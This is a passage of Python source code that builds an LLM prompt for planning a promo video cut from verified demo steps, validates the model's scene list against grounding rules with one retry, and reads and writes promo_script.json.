                f"- what it does: {plan.quickstart_summary}",
                f"- verified success command: {plan.success_criteria.command}",
            ]
        ),
        "## Target",
        "\n".join(
            [
                f"- target total duration: {target_duration_s} seconds",
                f"- demo.mp4 runs about {total_s} seconds",
                # The cut cannot contain more footage than the verified steps
                # hold; saying so up front stops the model from padding a short
                # run to the target with spans that do not exist.
                f"- verified footage available: {round(_available_footage_s(steps), 3)}"
                " seconds across the steps below (cards make up any remainder)",
            ]
        ),
        "## VERIFIED STEPS — the only footage that exists",
        f"```\n{_format_steps_table(steps)}\n```",
        "Respond with ONLY the JSON object matching the PromoScript schema.",
    ]
    return "\n\n".join(parts)


def run_promo_script(
    plan: Plan,
    log: CommandLog,
    guide_text: str,
    timestamps: dict,
    model: str,
    repo_url: str = "",
    target_duration_s: float = DEFAULT_TARGET_DURATION_S,
) -> tuple[PromoScript, float]:
    """Plan the promo cut with one LLM pass, enforcing grounding in code.

    Mirrors :func:`distill.run_distiller`: if the first response breaks any rule
    in :func:`collect_violations`, retry ONCE with the violations listed
    explicitly; if the retry still violates, raise :class:`PromoScriptError`.

    Args:
        plan: the run's plan.json — the source of the card facts.
        log: ``command_log.json``; the grounding authority for step commands.
        guide_text: the text of the FINAL ``step_by_step.md`` (post-tutorial).
        timestamps: the parsed ``step_timestamps.json`` payload.
        model: model id for the LLM pass.
        repo_url: repository URL, for the title card (empty on guide-only runs).
        target_duration_s: length the prompt asks the cut to aim for.

    Returns:
        ``(validated script, total llm cost in USD)``.

    Raises:
        PromoScriptError: when no step is eligible for footage (raised before
            any paid call), or when the retry is still violating.
    """
    steps = eligible_steps(guide_text, log, timestamps)
    if not steps:
        raise PromoScriptError(
            "No verified step is eligible for promo footage: no step of "
            "step_by_step.md is both published and grounded in command_log.json. "
            "A promo cut with no real footage is not published.",
            cost_usd=0.0,
        )

    system = (_PROMPTS_DIR / "promo_script.md").read_text(encoding="utf-8")
    user = _build_user_message(
        plan, steps, repo_url, target_duration_s, _float(timestamps.get("total_min_s"))
    )
    total_cost = 0.0

    script, cost = llm.complete_json(
        system=system, user=user, model=model, schema=PromoScript
    )
    total_cost += cost

    violations = collect_violations(script, guide_text, log, timestamps, plan)
    if violations:
        retry_user = (
            f"{user}\n\n"
            "## GROUNDING VIOLATIONS — your previous response was rejected\n\n"
            "Your scene list broke these rules:\n"
            + "\n".join(f"- {v}" for v in violations)
            + "\n\nEvery demo_segment must cite an `index` from the VERIFIED "
            "STEPS table above and stay inside that step's window. Respond "
            "again with the complete JSON object."
        )
        script, cost = llm.complete_json(
            system=system, user=retry_user, model=model, schema=PromoScript
        )
        total_cost += cost
        violations = collect_violations(script, guide_text, log, timestamps, plan)
        if violations:
            raise PromoScriptError(
                "Promo script still violated the grounding rules after retry: "
                + "; ".join(repr(v) for v in violations),
                cost_usd=total_cost,
            )
    return script, total_cost


# -- artifact writing ---------------------------------------------------------


def write_promo_script(script: PromoScript, run_dir: Path) -> Path:
    """Write ``run_dir/promo_script.json``; returns the path."""
    run_dir.mkdir(parents=True, exist_ok=True)
    dest = run_dir / "promo_script.json"
    dest.write_text(script.model_dump_json(indent=2), encoding="utf-8")
    return dest


def load_promo_script(run_dir: Path) -> Optional[PromoScript]:
    """Read back ``run_dir/promo_script.json``, or ``None`` when absent."""
    src = run_dir / "promo_script.json"
    if not src.is_file():
        return None
    return PromoScript.model_validate_json(src.read_text(encoding="utf-8"))
